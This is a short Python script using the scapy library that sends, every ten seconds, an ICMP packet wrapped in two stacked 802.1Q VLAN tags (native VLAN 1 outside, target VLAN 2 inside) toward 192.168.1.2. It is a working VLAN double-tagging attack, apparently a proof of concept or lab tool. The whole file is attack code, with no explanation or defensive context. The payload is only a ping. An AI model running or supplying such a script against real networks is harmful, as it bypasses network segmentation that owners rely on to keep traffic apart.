#!/usr/bin/python

import time
from scapy.all import *

iface = "en0"
our_vlan = 1
target_vlan = 2
target_ip = '192.168.1.2'


ether = Ether()
dot1q1 = Dot1Q(vlan=our_vlan)
dot1q2 = Dot1Q(vlan=target_vlan)
ip = IP(dst=target_ip)
icmp = ICMP()

packet = ether/dot1q1/dot1q2/ip/icmp

try:
    while True:
        sendp(packet, iface=iface)
        time.sleep(10)

except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)

